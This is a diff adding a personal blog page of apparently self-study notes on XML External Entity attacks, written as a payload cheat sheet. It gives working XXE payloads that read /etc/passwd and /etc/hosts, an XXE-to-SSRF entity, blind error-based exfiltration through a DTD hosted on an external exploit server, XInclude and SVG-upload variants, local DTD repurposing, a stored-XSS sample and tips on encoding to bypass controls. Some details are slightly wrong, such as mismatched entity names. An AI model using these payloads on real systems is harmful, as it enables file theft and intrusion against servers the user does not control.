@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Mi Blog</title>
+  <link rel="stylesheet" href="file:///Users/b0ydc/Documents/CYBER/SITE/css/styles.css">
+</head>
+<body>
+  <header>
+    <h4 align="right">@b0ydC</h4>
+  </header>
+
+  <main>
+    <article>
+     
+<h2>1. GENERAL INFORMATION</h2>  
+
+<code>
+
+NOTES:<br><br>
+1. Important to inspect the requests/responses, if XML code is present there's a chance to attempt XXE.<br>
+2. Each time you find a site to upload files and the .xml extention is allowed, XXE attempts are needed. <br>
+3. DTD means, data definition type.<br>
+4. Think on DTD as a "declared variable" that you can personalize and invoke. <br>
+5. One way to bypass chunk issues is to encode the payloads in base64. prettry used on blind attacks<br><br>
+  
+SAMPLE: <!ENTITY % VAR_NAME SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"><br><br>
+
+6. if some test are not providing results, attempt with an external dtd, so you can exfiltrate data a confirm a blind XXE.<br><br>
+
+NOTE:<br> <br>
+- xsl = extensible stylesheet language | it is the style sheet of XML. so it can be invoked similar as we do with XML
+attacks.<br><br>
+
+<xsl:stylesheet version="1.0"> &lt;&sol;xsl:stylesheet>
+
+</code>          
+
+<h2>2. EXTERNAL ENTITIES</h2> 
+
+<code>
+
+1. Traffic inspection is needed. [burpsuite]<br><br>
+
+SAMPLE:<br><br>
+
+&lt;&quest;xml version="1.0" encoding="UTF-8"?><br>
+&lt;&excl;DOCTYPE attempt [ &lt;&excl;ENTITY CUMBIA SYSTEM "file:///etc/hosts">]><br>
+&lt;Check><br>
+&lt;Id>&CUMBIA;&lt;&sol;Id><br>
+&lt;productId>1&lt;&sol;productId><br>
+&lt;/Check><br><br>
+
+GET DATA: &lt;&excl;DOCTYPE attempt [ &lt;&excl;ENTITY VAR_NAME SYSTEM "file:///etc/hosts"> ]> <br><br>
+
+NOTE:<br><br>
+- Important, to invoke the entity/variable you are passing, it is needed to use specific characters, &VAR_NAME;<br><br>
+
+XSS: &lt;&excl;[CDATA[&lt;script&gt;alert('stored XXS!')&lt;&sol;script>]]><br><br>
+
+- The name "CUMBIA" is the entity/variable name used to call /etc/hosts externally, it is invoked into the XML file and invoke 
+it using one input field. !!!! Special section to put the XML code, between initial tag and function. CHECK SAMPLE!<br>
+Modify the name as you want.
+
+</code>          
+
+<h2>3. CROSS ATTACKS</h2>  
+
+<code>
+
+<u>XXE to SSRF</u><br><br>
+
+There's one simple attempt that can be executed, for this case scenario a vuln_server will be needed to exploit this. This attack can 
+be considered "external entities" attack. Same payload and technique can be used to exploit this. <br><br>
+
+GET DATA: &lt;&excl;DOCTYPE attempt [ &lt;&excl;ENTITY VAR_NAME SYSTEM "http://IP_ADDR/URI_PATH"> ]><br><br>
+
+Sometimes each time you find and call a URL path, probably the application will be printing the current/next path in action. Try to 
+see if others paths provide more information.<br><br>
+
+</code>
+
+<h2>4. BLIND TECHNIQUES</h2>  
+
+<u>VIA ERROR MESSAGES</u> <br><br>
+
+<code>
+
+NOTES:<br><br>
+- If the app is returning errors in regards XML parsing, technically that flaw can be abused to retrieve error messages. <br>
+- It helps to exfil multi-line information.<br>
+- Sometimes it is required two entities, one to define the file to exfil and the second one to try to read and generate the error.
+For that two functions are needed. exfil | eval<br>
+- Out-of-band communications can help to discover this flaw. That is why sometimes is needed to use an external exploit server to 
+host the exploit file. <br><br>
+
+</code>          
+
+<u>ATTACK SAMPLE:</u><br><br>
+
+<code>          
+
+As it is a blind technique, an external exploit server to host the entities is needed. This flaw can be triggered locally, however, 
+external interaction is required.</code><br><br>
+
+<u>EXPLOIT SERVER HOSTING ENTITIES</u><br><br>
+
+<code>URL: https://URL/exploit</code><br><br>
+
+<u>STEP ONE: EXPLOIT FILE | CUMBIA.html</u><br><br>
+
+<code>
+
+&lt;&excl;DOCTYPE html&gt;<br>
+&lt;html&gt;<br>
+  &lt;head&gt;<br>
+  HTTP/1.1 200 OK<br>
+  Content-Type: text/plain; charset=utf-8  
+  &lt;&sol;head&gt;<br>
+  &lt;body&gt;<br>
+  TEXT<br>
+  &lt;&excl;ENTITY % file SYSTEM "file:///etc/hosts"><br>
+  &lt;&excl;ENTITY % eval "&lt;&excl;ENTITY % exfil SYSTEM 'file:///404FILE/%file;'>"><br>
+  %eval;<br>
+  %exfil;<br>
+  &lt;&sol;body&gt;<br>
+&lt;&sol;html&gt;<br><br>
+
+NOTE:<br> <br>
+- when invoking an entity into an entity, the % symbol need to be encoded as %<br><br>
+
+ENTITY TO EXFIL:  &lt;&excl;ENTITY % eval " &lt;&excl;ENTITY % exfil SYSTEM 'file:///404FILE/%file;'>"><br>
+ENTITY TO GENERATE ERROR:  &lt;&excl;ENTITY % eval " &lt;&excl;ENTITY % error SYSTEM 'file:///404FILE/%file;'>"><br><br>
+
+</code>
+
+<u>STEP TWO: INSERT DTD</u><br><br>
+
+<code>
+
+&lt;&excl;DOCTYPE attempt [&lt;&excl;ENTITY % VAR_NAME SYSTEM "http://DTD-URL/CUMBIA.html"> %VAR_NAME;]><br><br>
+
+NOTE:<br> <br>
+- very important to encode, encoding to base64, URL encode, etc. one time, two times, can bypass a lot of controls.
+
+</code>
+
+<h2>5. EXPLOTE XInlcude</h2>  
+
+<code>
+
+NOTES:<br><br>
+- Is a part of the XML specification that allows an XML document to be built from sub-documents.<br>
+- No way to control the entire XML document and so we cannot define the DOCTYPE element. That's when XInclude works!<br>
+- You can place an XInclude attack within any data value in an XML document. So any input field can work!<br>
+- It need two references, one to the structure and the second to the content to retrieve.<br><br>
+
+SAMPLE:<br><br> 
+
+&lt;NAME xmlns:xi="http://www.w3.org/2001/XInclude" ><xi:include parse="text" href="file:///etc/passwd"&sol;&gt;&lt;&sol;NAME><br><br>
+
+xmlns, means the body structure of the file.<br> 
+xi, used to add attributes, <br><br>sample: href, parsing, etc. 
+
+</code>
+
+<h2>6. XXE via FILE UPLOAD</h2>  
+
+<code>
+
+it is important to note about possible options to upload files.<br><br>
+
+- what are the extensions allowed ?<br>
+- same similar techniques used on LFI or RFI can be applied.<br>
+- SVG is formated in XML format, so each time you find a place to upload the files
+you can escalate from file upload to XXE.<br>
+- you can create a image file, as it is XML format you can set some basic parameters to create a image to retrieve the content
+you are setting.<br><br>
+
+payload:<br><br>
+&lt;&quest;xml version="1.0" standalone="yes"?>&lt;&excl;DOCTYPE test [ &lt;&excl;ENTITY attempt SYSTEM "file:///etc/whoami" > &rsqb;&gt;&lt;svg width="128px" 
+height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"&gt;&lt;text font-size="16" x="0" 
+y="16">&xxe;&lt;&sol;text>&lt;&sol;svg><br><br>
+
+it is added same format as RFI or LFI attacks.
+
+</code>          
+
+<h2>7. XXE TO RETRIEVE DATA</h2>  
+
+<code>
+
+- in order to exploit this one, you will need to reuse an existing DTD that is stored on the server, you will use it as benefit for
+the attack.<br>
+- so first you need to know what environment you are working on to search for existing well know DTD to reference.<br><br>
+
+<u>format of the DTD to use:</u><br><br>
+1. you need to declare the local DTD<br>
+2. you need to declare the entity and inside retrieve the file/eval/error entities (check sample structure)<br>
+3. you need to declare the content to retrieve with a SYSTEM entity<br>
+4. you need to declare the EVAL entity with an ERROR entity to a non-existent file to generate the error<br>
+5. invoke all 3 entities<br><br>
+
+<u>sample payload:</u><br><br>
+
+&lt;&excl;DOCTYPE message [<br>
+&lt;&excl;ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"><br>
+&lt;&excl;ENTITY % ISOamso '<br>
+&lt;&excl;ENTITY % file SYSTEM "file:///etc/passwd"><br>
+&lt;&excl;ENTITY % eval "&lt;&excl;ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>"><br>
+%eval;<br>
+%error;<br>
+'><br>
+%local_dtd;<br>
+]><br><br>
+
+NOTE:<br> <br>
+- docbookx.dtd is a common DTD found on GNOME desktop.<br><br>
+It is pretty important to understand how the local DTD works in order to use it, as it will be invoked. 
+
+</code>
+
+
+    </article>
+
+
+  </main>
+
+</body>
+</html>
